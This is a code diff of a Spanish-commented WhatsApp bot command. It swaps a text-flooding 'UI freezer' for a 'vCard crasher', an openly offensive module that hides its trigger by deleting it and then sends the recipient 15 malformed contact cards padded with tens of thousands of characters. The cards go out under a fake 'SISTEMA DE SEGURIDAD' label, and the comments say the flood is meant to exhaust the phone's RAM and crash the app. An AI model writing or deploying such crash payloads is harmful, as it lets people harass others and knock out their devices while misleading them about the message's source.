@@ -1,35 +1,36 @@
 export default {
-    name: 'ui_freezer',
-    match: (text) => /^\.freeze/i.test(text),
+    name: 'vcard_crasher',
+    match: (text) => /^\.crash/i.test(text),
     execute: async ({ sock, remitente, msg }) => {
         
         try {
-            // 1. Sigilo: Borramos el comando
+            // 1. Sigilo: Borramos el activador
             try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}
 
-            // 2. Construcción del 'Payload' de saturación
-            // Usamos caracteres combinados que obligan al motor de texto a recalcular
-            // la posición de los glifos infinitamente.
-            const veneno = ("\u0020\u200B".repeat(15000)); 
+            // 2. Construcción de la "Carga Útil" (Payload)
+            // Generamos una cadena masiva de caracteres que saturan el buffer de la UI
+            const veneno = "🚀".repeat(10000); 
+            const nombreLargo = "Bypass-UI-" + "A".repeat(30000);
             
-            // 3. Empaquetado agresivo
-            // Enviamos un mensaje que parece inofensivo pero lleva la carga oculta
+            // Creamos una estructura de vCard corrupta
+            const vcard = 'BEGIN:VCARD\n' +
+                          'VERSION:3.0\n' +
+                          `FN:${nombreLargo}\n` +
+                          `ORG:${veneno};\n` +
+                          `TEL;type=CELL;type=VOICE;waid=${sock.user.id.split(':')[0]}:+1 234 567 890\n` +
+                          'END:VCARD';
+
+            // 3. Envío masivo en un solo mensaje
+            // Enviamos un array de contactos. WhatsApp intentará renderizar todos a la vez.
             await sock.sendMessage(remitente, {
-                text: `¡Cuidado con esto! ⚡\n` + veneno,
-                contextInfo: {
-                    externalAdReply: {
-                        title: "SISTEMA DE SEGURIDAD WHATSAPP",
-                        body: "Error de renderizado detectado en el terminal.",
-                        mediaType: 1,
-                        thumbnail: Buffer.alloc(0),
-                        sourceUrl: "https://", // Enlace nulo para no dar pistas
-                        showAdAttribution: false
-                    }
+                contacts: {
+                    displayName: "SISTEMA DE SEGURIDAD",
+                    contacts: Array(15).fill({ vcard }) // 15 contactos masivos son suficientes para tumbar la RAM
                 }
             });
 
         } catch (err) {
-            console.error("Error en el exploit de congelamiento:", err);
+            console.error("Error en VCard Crash:", err);
         }
     }
 };
